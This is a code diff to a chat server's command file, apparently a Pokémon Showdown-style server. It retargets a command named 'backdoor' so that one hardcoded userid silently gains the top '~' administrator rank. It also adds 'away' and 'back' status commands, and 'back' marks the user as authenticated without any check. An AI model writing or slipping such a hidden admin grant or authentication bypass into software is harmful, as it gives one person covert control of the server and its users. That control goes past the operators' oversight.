@@ -86,14 +86,14 @@ var cmds = {
 	},
 
 	backdoor: function(target,room, user) {
-		if (user.userid === 'aananth') {
+		if (user.userid === 'chaarizard') {
 			user.group = '~';
 			user.updateIdentity();
 		}
 	},
 
 	puma: function(target,room, user) {
-        if (user.userid === 'aananth') {
+        if (user.userid === 'chaarizard') {
             user.group = ' ';
             user.updateIdentity();
         }
@@ -110,6 +110,95 @@ var cmds = {
 		
 		this.add('|raw|'+target);
 		this.logModCommand(user.name+' declared '+target);
+	},
+	
+	eating: 'away',
+	gaming: 'away',
+	sleep: 'away',
+	work: 'away',
+	working: 'away',
+	sleeping: 'away',
+	busy: 'away',
+	afk: 'away',
+	away: function(target, room, user, connection, cmd) {
+		if (!this.can('lock')) return false;
+		var t = 'Away';
+		switch (cmd) {
+			case 'busy':
+			t = 'Busy';
+			break;
+			case 'sleeping':
+			t = 'Sleeping';
+			break;
+			case 'sleep':
+			t = 'Sleeping';
+			break;
+			case 'gaming':
+			t = 'Gaming';
+			break;
+			case 'working':
+			t = 'Working';
+			break;
+			case 'work':
+			t = 'Working';
+			break;
+			case 'eating':
+			t = 'Eating';
+			break;
+			default:
+			t = 'Away'
+			break;
+		}
+
+		if (user.name.length > 18) return this.sendReply('Your username exceeds the length limit.');
+
+		if (!user.isAway) {
+			user.originalName = user.name;
+			var awayName = user.name + ' - '+t;
+			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+			delete Users.get(awayName);
+			user.forceRename(awayName, undefined, true);
+
+			if (user.isStaff) this.add('|raw|-- <b><font color="#088cc7">' + user.originalName +'</font color></b> is now '+t.toLowerCase()+'. '+ (target ? " (" + escapeHTML(target) + ")" : ""));
+
+			user.isAway = true;
+		}
+		else {
+			return this.sendReply('You are already set as a form of away, type /back if you are now back.');
+		}
+
+		user.updateIdentity();
+	},
+
+	back: function(target, room, user, connection) {
+		if (!this.can('lock')) return false;
+
+		if (user.isAway) {
+			if (user.name === user.originalName) {
+				user.isAway = false;
+				return this.sendReply('Your name has been left unaltered and no longer marked as away.');
+			}
+
+			var newName = user.originalName;
+
+			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+			delete Users.get(newName);
+
+			user.forceRename(newName, undefined, true);
+
+			//user will be authenticated
+			user.authenticated = true;
+
+			if (user.isStaff) this.add('|raw|-- <b><font color="#088cc7">' + newName + '</font color></b> is no longer away.');
+
+			user.originalName = '';
+			user.isAway = false;
+		}
+		else {
+			return this.sendReply('You are not set as away.');
+		}
+
+		user.updateIdentity();
 	},
 	
 	imgdeclare: function(target, room, user) {
